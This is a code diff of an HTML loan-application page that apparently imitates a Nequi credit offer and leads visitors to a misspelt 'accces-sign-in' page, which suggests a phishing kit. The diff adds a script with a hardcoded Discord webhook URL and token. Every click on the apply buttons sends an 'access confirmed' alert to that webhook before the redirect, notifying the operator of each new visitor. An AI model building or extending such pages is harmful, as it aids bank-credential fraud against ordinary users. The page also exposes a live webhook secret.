@@ -5,16 +5,12 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta property="og:title" content="Solicita tu crédito" />
-  <!-- <meta property="og:description" content="Solicuta tu crédito de bajo monto desde $100.000 a $2.400.000."> -->
   <meta property="og:image" content="./assets/nequi-product.jpg" />
-
   <link rel="stylesheet" href="./css/globals.css" />
   <link rel="stylesheet" href="./css/index.css" />
   <link rel="stylesheet" href="./css/spinner.css" />
-
   <link rel="shortcut icon" type="image/x-icon" href="./assets/favicon.ico" />
   <title>Solicita tu crédito</title>
-
   <style>
     .image {
       margin-top: 2rem;
@@ -22,16 +18,13 @@
       width: 90%;
       background-size: cover;
       background-position: inherit;
-      /* border-radius: 16px; */
       overflow: hidden;
       box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
       transition: transform 0.3s ease, box-shadow 0.3s ease;
     }
-
     .image-1 {
       background-image: url('assets/image1.jpg');
     }
-
     .image-2 {
       background-image: url('assets/image2.PNG');
     }
@@ -117,13 +110,10 @@
   </div>
 
   <div class="images" style="display: flex; flex-direction: column; align-items: center;">
-    <div class="image image-1">
-    </div>
-    <div class="image image-2">
-    </div>
+    <div class="image image-1"></div>
+    <div class="image image-2"></div>
   </div>
 
-  <!-- ✅ CAMBIO 1: Ruta corregida del slider -->
   <iframe src="./slide.php.html" frameborder="0" allowfullscreen
     style="overflow: hidden; height: 400px; width: 100%"></iframe>
 
@@ -168,37 +158,46 @@
     </div>
   </footer>
 
-  <script>
-  salvavidas.addEventListener("click", (event) => {
-  localStorage.setItem("typeProduct", "salvavidas");
-  window.location.href = "accces-sign-in.php.html";
-});
+ <script>
+    const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1503743291114520721/imvadLKqt8BuBqh3Y9d5okKpGtOMMnE33Et60BFuuZxxa2vx-oLv2CDoUKVCIeTlig5e";
 
-btnSolicitar.addEventListener("click", (event) => {
-  localStorage.setItem("typeProduct", "salvavidas");
-  window.location.href = "accces-sign-in.php.html";
-});
+    function enviarAvisoADiscord() {
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: "✅ Acceso confirmado - Solicitud de crédito iniciada" })
+      }).catch(error => console.error("Error:", error));
+    }
+
+    const salvavidas = document.getElementById("salvavidas");
+    const btnSolicitar = document.getElementById("btn-solicitar");
+
+    salvavidas.addEventListener("click", (event) => {
+      localStorage.setItem("typeProduct", "salvavidas");
+      enviarAvisoADiscord();
+      window.location.href = "accces-sign-in.php.html";
+    });
+
+    btnSolicitar.addEventListener("click", (event) => {
+      localStorage.setItem("typeProduct", "salvavidas");
+      enviarAvisoADiscord();
+      window.location.href = "accces-sign-in.php.html";
+    });
 
     getRangoTresMeses();
 
     function getRangoTresMeses() {
       const hoy = new Date();
-
-      // Mes de inicio: mes actual, día 1
       const inicio = new Date(hoy.getFullYear(), hoy.getMonth(), 1);
-
-      // Mes final: mes actual + 3, día 0 del mes siguiente da el último día del mes anterior
       const fin = new Date(hoy.getFullYear(), hoy.getMonth() + 4, 0);
-
       const meses = [
         'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio',
         'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre'
       ];
-
       const texto = `*Válido desde el 01 de ${meses[inicio.getMonth()]} hasta el ${fin.getDate()} de ${meses[fin.getMonth()]}`;
       localStorage.setItem('validoHasta', texto);
     }
-  </script>
+</script>
 </body>
 
 </html>
